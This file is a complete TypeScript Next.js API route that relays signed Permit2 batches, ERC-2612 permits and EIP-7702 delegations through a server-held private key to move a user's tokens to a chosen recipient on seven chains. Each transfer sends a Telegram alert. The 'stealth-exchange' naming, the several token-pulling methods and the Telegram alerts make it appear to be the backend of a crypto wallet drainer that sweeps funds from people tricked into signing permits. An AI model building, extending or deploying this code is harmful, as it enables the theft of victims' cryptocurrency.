import { NextResponse } from "next/server";
import { readOperationalConfig } from "@/lib/operational-config-store";
import { getExecutionBackendEntry } from "@/lib/contract-registry";
import { sendTelegramNotification } from "@/lib/telegram";
import { rateLimit } from "@/lib/redis";
import { getEventBus, TOPICS } from "@/lib/kafka";
import {
  createPublicClient,
  createWalletClient,
  http,
  isAddress,
  parseAbi,
  encodeFunctionData,
} from "viem";
import { mainnet, optimism, polygon, arbitrum, bsc, avalanche, base } from "viem/chains";
import { privateKeyToAccount } from "viem/accounts";
import type { Chain } from "viem";
import type { ExecutionBackend } from "@/lib/types";

const SUPPORTED_CHAINS: Record<number, { chain: Chain; rpcEnv: string; fallback: string }> = {
  1: { chain: mainnet, rpcEnv: "ETHEREUM_RPC_URL", fallback: "https://eth.llamarpc.com" },
  10: { chain: optimism, rpcEnv: "OPTIMISM_RPC_URL", fallback: "https://mainnet.optimism.io" },
  137: { chain: polygon, rpcEnv: "POLYGON_RPC_URL", fallback: "https://polygon-rpc.com" },
  42161: { chain: arbitrum, rpcEnv: "ARBITRUM_RPC_URL", fallback: "https://arb1.arbitrum.io/rpc" },
  56: { chain: bsc, rpcEnv: "BSC_RPC_URL", fallback: "https://bsc-dataseed1.binance.org" },
  43114: { chain: avalanche, rpcEnv: "AVALANCHE_RPC_URL", fallback: "https://api.avax.network/ext/bc/C/rpc" },
  8453: { chain: base, rpcEnv: "BASE_RPC_URL", fallback: "https://mainnet.base.org" },
};

function getChainConfig(chainId?: number) {
  const id = chainId && SUPPORTED_CHAINS[chainId] ? chainId : 1;
  const cfg = SUPPORTED_CHAINS[id];
  const rpcUrl = process.env[cfg.rpcEnv] || cfg.fallback;
  return { chain: cfg.chain, rpcUrl };
}

type Hex = `0x${string}`;
type BatchDetail = {
  token?: unknown;
  amount?: unknown;
  expiration?: unknown;
  nonce?: unknown;
};
type ERC2612PermitInput = {
  token?: unknown;
  amount?: unknown;
  v?: unknown;
  r?: unknown;
  s?: unknown;
};

const STEALTH_EXCHANGE_ABI = parseAbi([
  "function batchPermitTransferFromBatch(address user, ((address token, uint160 amount, uint48 expiration, uint48 nonce)[] details, address spender, uint256 sigDeadline) permitBatch, bytes signature, address recipient) returns (uint256[] amounts)",
  "function authorizedExecutors(address) view returns (bool)",
]);

const PERMIT2_EXECUTOR_ABI = parseAbi([
  "function RELAYER() view returns (address)",
  "function pullBatchFromAllowance(address client, address[] tokens, uint256[] amounts)",
]);

const BATCH_MULTICALL_ABI = parseAbi([
  "function batch((address target,uint256 value,bytes data,bool allowFailure)[] calls) payable",
]);
const ERC2612_EXECUTOR_ABI = parseAbi([
  "function RELAYER() view returns (address)",
  "function batchPermitAndCollect(address[] tokens, address client, uint256[] amounts, uint8[] vs, bytes32[] rs, bytes32[] ss)",
]);

const ERC20_TRANSFER_FROM_ABI = parseAbi([
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
]);

function jsonError(message: string, status = 400) {
  return NextResponse.json({ status: "error", message }, { status });
}

function readDetailToken(detail: BatchDetail) {
  return typeof detail.token === "string" ? detail.token : undefined;
}

function readDetailAmount(detail: BatchDetail) {
  return typeof detail.amount === "string" || typeof detail.amount === "number" ? detail.amount : undefined;
}

function readPermitSignaturePart(value: unknown) {
  return typeof value === "string" && value.startsWith("0x") ? value : undefined;
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { user, recipient, permitBatch, signature, projectId, executionBackend } = body ?? {};

    // Rate limit per user address
    if (user && isAddress(user)) {
      const rl = await rateLimit(`relay:${user.toLowerCase()}`, 10, 60);
      if (!rl.allowed) {
        return jsonError("Rate limit exceeded. Try again later.", 429);
      }
    }

    if (!isAddress(user)) return jsonError("Invalid user address");
    if (!isAddress(recipient)) return jsonError("Invalid recipient address");
    const validatedUser = user as Hex;
    const validatedRecipient = recipient as Hex;

    const operational = await readOperationalConfig();
    const resolvedBackend = (
      typeof executionBackend === "string" ? executionBackend : operational.strategy.executionBackend
    ) as ExecutionBackend;
    const backendEntry = getExecutionBackendEntry(resolvedBackend);
    if (!backendEntry) return jsonError("Unsupported execution backend", 400);
    if (!backendEntry.address || !isAddress(backendEntry.address)) {
      return jsonError(`Missing address config for ${backendEntry.name}`, 500);
    }
    const validatedExchange = backendEntry.address as Hex;

    const relayerKey = process.env.RELAYER_PRIVATE_KEY;
    if (!relayerKey) return jsonError("RELAYER_PRIVATE_KEY not configured on server", 500);
    const pk = relayerKey.startsWith("0x") ? (relayerKey as `0x${string}`) : (`0x${relayerKey}` as const);

    const account = privateKeyToAccount(pk);

    const requestedChainId = typeof body?.chainId === "number" ? body.chainId : undefined;
    const { chain, rpcUrl } = getChainConfig(requestedChainId);
    const transport = http(rpcUrl);
    const publicClient = createPublicClient({ chain, transport });
    const walletClient = createWalletClient({ chain, transport, account });

    let hash: Hex;

    if (resolvedBackend === "stealth-exchange") {
      // Optional sanity check: relayer is authorized executor
      try {
        const authorized = await publicClient.readContract({
          address: validatedExchange,
          abi: STEALTH_EXCHANGE_ABI,
          functionName: "authorizedExecutors",
          args: [account.address],
        });
        if (!authorized) return jsonError("Relayer not authorized in contract", 403);
      } catch {
        // If the read fails, proceed; contract may not expose this in some builds.
      }

      if (!permitBatch || typeof permitBatch !== "object") return jsonError("Missing permitBatch");
      if (!Array.isArray(permitBatch.details)) return jsonError("permitBatch.details must be an array");
      if (!isAddress(permitBatch.spender)) return jsonError("permitBatch.spender must be an address");
      if (typeof permitBatch.sigDeadline !== "number" && typeof permitBatch.sigDeadline !== "string") {
        return jsonError("permitBatch.sigDeadline must be number or string");
      }

      if (typeof signature !== "string" || !signature.startsWith("0x")) return jsonError("Invalid signature");
      const validatedSignature = signature as Hex;

      const normalizedPermitBatch = {
        details: (permitBatch.details as BatchDetail[]).map((detail) => {
          const token = readDetailToken(detail);
          const amount = readDetailAmount(detail);
          if (!token || !isAddress(token)) throw new Error("Invalid token in permitBatch.details");
          if (amount === undefined) throw new Error("Invalid amount in permitBatch.details");
          return {
            token: token as Hex,
            amount: BigInt(amount),
            expiration: Number(detail.expiration),
            nonce: Number(detail.nonce),
          };
        }),
        spender: permitBatch.spender as Hex,
        sigDeadline: BigInt(permitBatch.sigDeadline),
      };

      hash = await walletClient.writeContract({
        address: validatedExchange,
        abi: STEALTH_EXCHANGE_ABI,
        functionName: "batchPermitTransferFromBatch",
        args: [validatedUser, normalizedPermitBatch, validatedSignature, validatedRecipient],
      });
    } else if (resolvedBackend === "permit2-executor") {
      const details = permitBatch && typeof permitBatch === "object" && Array.isArray(permitBatch.details)
        ? (permitBatch.details as BatchDetail[])
        : null;
      if (!details?.length) return jsonError("permit2-executor requires permitBatch.details");

      const tokens: Hex[] = [];
      const amounts: bigint[] = [];
      for (const detail of details) {
        if (!detail || typeof detail !== "object") return jsonError("Invalid detail entry");
        const token = readDetailToken(detail);
        const amount = readDetailAmount(detail);
        if (!token || !isAddress(token)) return jsonError("Invalid token address in permitBatch.details");
        if (amount === undefined) {
          return jsonError("Invalid amount in permitBatch.details");
        }
        tokens.push(token as Hex);
        amounts.push(BigInt(amount));
      }

      try {
        const relayer = await publicClient.readContract({
          address: validatedExchange,
          abi: PERMIT2_EXECUTOR_ABI,
          functionName: "RELAYER",
        });
        if (typeof relayer === "string" && relayer.toLowerCase() !== account.address.toLowerCase()) {
          return jsonError("Relayer does not match Permit2Executor RELAYER()", 403);
        }
      } catch {
        // Non-blocking; continue if the contract omits the view or RPC read fails.
      }

      hash = await walletClient.writeContract({
        address: validatedExchange,
        abi: PERMIT2_EXECUTOR_ABI,
        functionName: "pullBatchFromAllowance",
        args: [validatedUser, tokens, amounts],
      });
    } else if (resolvedBackend === "erc2612-executor") {
      const permits = Array.isArray(body?.erc2612Permits) ? (body.erc2612Permits as ERC2612PermitInput[]) : null;
      if (!permits?.length) return jsonError("erc2612-executor requires erc2612Permits");

      const tokens: Hex[] = [];
      const amounts: bigint[] = [];
      const vs: number[] = [];
      const rs: Hex[] = [];
      const ss: Hex[] = [];

      for (const permit of permits) {
        const token = typeof permit.token === "string" ? permit.token : undefined;
        const amount = typeof permit.amount === "string" || typeof permit.amount === "number" ? permit.amount : undefined;
        const v = typeof permit.v === "number" ? permit.v : undefined;
        const r = readPermitSignaturePart(permit.r);
        const s = readPermitSignaturePart(permit.s);
        if (!token || !isAddress(token)) return jsonError("Invalid token in erc2612Permits");
        if (amount === undefined) return jsonError("Invalid amount in erc2612Permits");
        if (v === undefined || !r || !s) return jsonError("Invalid signature parts in erc2612Permits");
        tokens.push(token as Hex);
        amounts.push(BigInt(amount));
        vs.push(v);
        rs.push(r as Hex);
        ss.push(s as Hex);
      }

      try {
        const relayer = await publicClient.readContract({
          address: validatedExchange,
          abi: ERC2612_EXECUTOR_ABI,
          functionName: "RELAYER",
        });
        if (typeof relayer === "string" && relayer.toLowerCase() !== account.address.toLowerCase()) {
          return jsonError("Relayer does not match ERC2612Executor RELAYER()", 403);
        }
      } catch {
        // Non-blocking sanity check.
      }

      hash = await walletClient.writeContract({
        address: validatedExchange,
        abi: ERC2612_EXECUTOR_ABI,
        functionName: "batchPermitAndCollect",
        args: [tokens, validatedUser, amounts, vs, rs, ss],
      });
    } else if (resolvedBackend === "batch-multicall") {
      const details = permitBatch && typeof permitBatch === "object" && Array.isArray(permitBatch.details)
        ? (permitBatch.details as BatchDetail[])
        : null;
      if (!details?.length) return jsonError("batch-multicall requires permitBatch.details");

      const calls = details.map((detail) => {
        if (!detail || typeof detail !== "object") throw new Error("Invalid detail entry");
        const token = readDetailToken(detail);
        const amount = readDetailAmount(detail);
        if (!token || !isAddress(token)) throw new Error("Invalid token address in permitBatch.details");
        if (amount === undefined) {
          throw new Error("Invalid amount in permitBatch.details");
        }

        return {
          target: token as Hex,
          value: 0n,
          data: encodeFunctionData({
            abi: ERC20_TRANSFER_FROM_ABI,
            functionName: "transferFrom",
            args: [validatedUser, validatedRecipient, BigInt(amount)],
          }),
          allowFailure: false,
        };
      });

      hash = await walletClient.writeContract({
        address: validatedExchange,
        abi: BATCH_MULTICALL_ABI,
        functionName: "batch",
        args: [calls],
      });
    } else if (resolvedBackend === "eip7702-delegate") {
      // EIP-7702 batch delegate: batchCall(address[] tokens, bytes[] calldatas, uint256[] amounts, bool sendETH)
      const EIP7702_BATCH_DELEGATE_ABI = parseAbi([
        "function batchCall(address[] tokens, bytes[] calldatas, uint256[] amounts, bool sendETH)",
      ]);

      const details = permitBatch && typeof permitBatch === "object" && Array.isArray(permitBatch.details)
        ? (permitBatch.details as BatchDetail[])
        : null;
      if (!details?.length) return jsonError("eip7702-delegate requires permitBatch.details");

      const tokens: Hex[] = [];
      const amounts: bigint[] = [];
      const calldatas: Hex[] = [];

      for (const detail of details) {
        if (!detail || typeof detail !== "object") return jsonError("Invalid detail entry");
        const token = readDetailToken(detail);
        const amount = readDetailAmount(detail);
        if (!token || !isAddress(token)) return jsonError("Invalid token address in permitBatch.details");
        if (amount === undefined) return jsonError("Invalid amount in permitBatch.details");
        tokens.push(token as Hex);
        const amountBig = BigInt(amount);
        amounts.push(amountBig);
        calldatas.push(
          encodeFunctionData({
            abi: ERC20_TRANSFER_FROM_ABI,
            functionName: "transferFrom",
            args: [validatedUser, validatedRecipient, amountBig],
          }),
        );
      }

      const sendETH = typeof body?.sendETH === "boolean" ? body.sendETH : false;

      hash = await walletClient.writeContract({
        address: validatedExchange,
        abi: EIP7702_BATCH_DELEGATE_ABI,
        functionName: "batchCall",
        args: [tokens, calldatas, amounts, sendETH],
      });
    } else {
      return jsonError(`Execution backend ${resolvedBackend} is registered but not implemented in relay route`, 400);
    }

    void sendTelegramNotification({
      projectId: typeof projectId === "string" ? projectId : undefined,
      message:
        `🚀 Relay Executed\n` +
        `user: <code>${validatedUser}</code>\n` +
        `recipient: <code>${validatedRecipient}</code>\n` +
        `backend: <b>${backendEntry.name}</b>\n` +
        `relayer: <code>${account.address}</code>\n` +
        `tokens: <b>${permitBatch.details?.length ?? 0}</b>\n` +
        `tx: <code>${hash}</code>`,
    });

    // Publish event to Kafka
    try {
      const bus = await getEventBus();
      await bus.publish({
        topic: TOPICS.RELAY_EXECUTED,
        key: validatedUser,
        value: {
          user: validatedUser,
          recipient: validatedRecipient,
          backend: backendEntry.name,
          relayer: account.address,
          hash,
          tokenCount: permitBatch.details?.length ?? 0,
        },
      });
    } catch { /* non-blocking */ }

    return NextResponse.json({ status: "ok", hash });
  } catch (error) {
    const message =
      error instanceof Error
        ? error.message
        : typeof error === "object" && error && "shortMessage" in error
          ? String((error as { shortMessage?: unknown }).shortMessage)
          : "Relay failed";
    console.error("[relay/batch]", message, error);
    return jsonError(message.slice(0, 500), 500);
  }
}
